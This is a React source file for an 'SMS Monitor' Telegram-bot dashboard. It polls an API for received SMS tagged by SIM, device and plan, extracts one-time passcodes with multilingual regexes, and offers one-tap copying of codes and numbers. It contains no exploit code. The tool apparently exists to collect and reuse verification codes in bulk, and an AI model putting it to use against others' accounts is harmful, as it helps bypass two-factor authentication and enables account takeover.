import { useEffect, useState } from "react";

const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");

interface SmsRow {
  timestamp: string;
  sim: string;
  phone: string;
  device: string;
  plan: string;
  body: string;
  isOtp: boolean;
}

interface Stats {
  totalRecords: string;
  totalDisplayed: string;
  otpCount: number;
  recent: SmsRow[];
  lastUpdated: string;
}

function useStats() {
  const [stats, setStats] = useState<Stats | null>(null);
  const [error, setError] = useState(false);

  const fetchStats = async () => {
    try {
      const res = await fetch(`${BASE}/api/sms-stats`);
      if (!res.ok) throw new Error("Failed");
      setStats(await res.json());
      setError(false);
    } catch {
      setError(true);
    }
  };

  useEffect(() => {
    fetchStats();
    const id = setInterval(fetchStats, 5000);
    return () => clearInterval(id);
  }, []);

  return { stats, error };
}

function extractOtp(text: string): string | null {
  const patterns = [
    /(?:OTP|otp|code|رمز|کد|verification|verify|confirm|auth|pin|passcode|пароль|код|senha)[^0-9]*(\d{4,8})/i,
    /(\d{4,8})[^0-9]*(?:OTP|otp|code|کد|رمز|verify|confirm|пароль|код)/i,
    /(?:is|:|-|=)\s*(\d{6})\b/,
    /(?<!\d)(\d{6})(?!\d)/,
    /(?<!\d)(\d{4})(?!\d)/,
    /^(\d{6})\b/,
    /^(\d{4})\b/,
  ];
  for (const p of patterns) {
    const m = text.match(p);
    if (m?.[1]) return m[1];
  }
  return null;
}

function formatTime(ts: string) {
  return ts.replace("T", " ").substring(0, 19);
}

function Pulse() {
  return (
    <span className="relative inline-flex h-2.5 w-2.5">
      <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
      <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500" />
    </span>
  );
}

export default function App() {
  const { stats, error } = useStats();
  const [copied, setCopied] = useState<string | null>(null);

  const copy = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(text);
    setTimeout(() => setCopied(null), 2000);
  };

  return (
    <div className="min-h-screen bg-[#0a0a0f] text-white font-sans">
      {/* Header */}
      <header className="border-b border-white/5 bg-[#0d0d14]">
        <div className="max-w-5xl mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-violet-600 to-indigo-600 flex items-center justify-center text-lg">
              🛰
            </div>
            <div>
              <h1 className="text-base font-semibold tracking-tight">SMS Monitor</h1>
              <p className="text-xs text-white/40">Telegram Bot Dashboard</p>
            </div>
          </div>
          <div className="flex items-center gap-2 text-xs font-medium">
            {error ? (
              <span className="flex items-center gap-1.5 text-red-400">
                <span className="w-2 h-2 rounded-full bg-red-500 inline-block" />
                API Error
              </span>
            ) : (
              <span className="flex items-center gap-1.5 text-emerald-400">
                <Pulse />
                Live
              </span>
            )}
            <span className="text-white/20">·</span>
            <span className="text-white/40">Refresh every 5s</span>
          </div>
        </div>
      </header>

      <main className="max-w-5xl mx-auto px-4 py-8 space-y-6">
        {/* Stat Cards */}
        <div className="grid grid-cols-3 gap-4">
          {[
            {
              icon: "📩",
              label: "Total SMS",
              value: stats?.totalRecords ?? "—",
              color: "from-blue-500/10 to-indigo-500/10 border-blue-500/20",
              text: "text-blue-400",
            },
            {
              icon: "🔐",
              label: "OTPs Detected",
              value: stats?.otpCount != null ? String(stats.otpCount) : "—",
              color: "from-violet-500/10 to-purple-500/10 border-violet-500/20",
              text: "text-violet-400",
            },
            {
              icon: "🤖",
              label: "Bot Status",
              value: error ? "Offline" : "Online",
              color: error
                ? "from-red-500/10 to-red-500/10 border-red-500/20"
                : "from-emerald-500/10 to-teal-500/10 border-emerald-500/20",
              text: error ? "text-red-400" : "text-emerald-400",
            },
          ].map((card) => (
            <div
              key={card.label}
              className={`rounded-2xl border bg-gradient-to-br ${card.color} p-5`}
            >
              <div className="text-2xl mb-2">{card.icon}</div>
              <div className={`text-2xl font-bold ${card.text}`}>{card.value}</div>
              <div className="text-xs text-white/40 mt-1">{card.label}</div>
            </div>
          ))}
        </div>

        {/* Recent SMS */}
        <div className="rounded-2xl border border-white/5 bg-[#0d0d14] overflow-hidden">
          <div className="px-5 py-4 border-b border-white/5 flex items-center justify-between">
            <h2 className="text-sm font-semibold text-white/80">Recent Messages</h2>
            {stats?.lastUpdated && (
              <span className="text-xs text-white/25">
                Updated {formatTime(stats.lastUpdated)}
              </span>
            )}
          </div>

          {!stats ? (
            <div className="p-8 text-center text-white/20 text-sm">Loading...</div>
          ) : stats.recent.length === 0 ? (
            <div className="p-8 text-center text-white/20 text-sm">No messages yet</div>
          ) : (
            <div className="divide-y divide-white/5">
              {stats.recent.map((row, i) => {
                const otp = row.isOtp ? extractOtp(row.body) : null;
                return (
                  <div key={i} className="px-5 py-4 hover:bg-white/[0.02] transition-colors">
                    <div className="flex items-start justify-between gap-3">
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 mb-1.5">
                          {row.isOtp ? (
                            <span className="inline-flex items-center gap-1 text-[10px] font-semibold px-2 py-0.5 rounded-full bg-violet-500/15 text-violet-400 border border-violet-500/20">
                              ⚡ OTP
                            </span>
                          ) : (
                            <span className="inline-flex items-center gap-1 text-[10px] font-semibold px-2 py-0.5 rounded-full bg-blue-500/10 text-blue-400 border border-blue-500/15">
                              📨 SMS
                            </span>
                          )}
                          <span className="text-xs font-mono text-white/50">{row.phone}</span>
                          <span className="text-white/15">·</span>
                          <span className="text-xs text-white/25">{formatTime(row.timestamp)}</span>
                        </div>
                        <p className="text-sm text-white/60 break-all leading-relaxed line-clamp-2">
                          {row.body}
                        </p>
                        <div className="flex items-center gap-2 mt-2 text-[11px] text-white/25">
                          <span>{row.sim}</span>
                          <span>·</span>
                          <span>{row.device}</span>
                          <span>·</span>
                          <span>{row.plan}</span>
                        </div>
                      </div>

                      {/* Copy buttons */}
                      <div className="flex flex-col gap-1.5 shrink-0">
                        {otp && (
                          <button
                            onClick={() => copy(otp)}
                            className="text-[11px] font-mono px-3 py-1.5 rounded-lg bg-violet-500/15 hover:bg-violet-500/25 text-violet-300 border border-violet-500/20 transition-colors flex items-center gap-1.5"
                          >
                            {copied === otp ? "✓ Copied" : `🔑 ${otp}`}
                          </button>
                        )}
                        <button
                          onClick={() => copy(row.phone)}
                          className="text-[11px] font-mono px-3 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-white/50 border border-white/8 transition-colors"
                        >
                          {copied === row.phone ? "✓ Copied" : "📱 Number"}
                        </button>
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>

        {/* Bot Info */}
        <div className="grid grid-cols-2 gap-4">
          <div className="rounded-2xl border border-white/5 bg-[#0d0d14] p-5">
            <h3 className="text-xs font-semibold text-white/40 uppercase tracking-wider mb-3">Bot Features</h3>
            <ul className="space-y-2.5">
              {[
                ["🔄", "Auto-refresh every 5 seconds"],
                ["🔐", "OTP auto-detection"],
                ["📋", "One-tap copy (OTP, Number, Message)"],
                ["📊", "Live statistics via /stats"],
                ["🌐", "Multi-language SMS support"],
                ["🔒", "Owner approval system"],
              ].map(([icon, text]) => (
                <li key={text} className="flex items-center gap-2.5 text-sm text-white/60">
                  <span className="text-base">{icon}</span>
                  <span>{text}</span>
                </li>
              ))}
            </ul>
          </div>

          <div className="rounded-2xl border border-white/5 bg-[#0d0d14] p-5">
            <h3 className="text-xs font-semibold text-white/40 uppercase tracking-wider mb-3">Bot Commands</h3>
            <ul className="space-y-2.5">
              {[
                ["/start", "Welcome & activate access"],
                ["/stats", "Live SMS & OTP statistics"],
                ["/status", "System health check"],
                ["/help", "Command reference"],
                ["/users", "Manage users (owner only)"],
              ].map(([cmd, desc]) => (
                <li key={cmd} className="flex items-start gap-2.5 text-sm">
                  <code className="text-violet-400 font-mono text-xs bg-violet-500/10 px-1.5 py-0.5 rounded shrink-0 mt-0.5">{cmd}</code>
                  <span className="text-white/50">{desc}</span>
                </li>
              ))}
            </ul>
          </div>
        </div>
      </main>
    </div>
  );
}
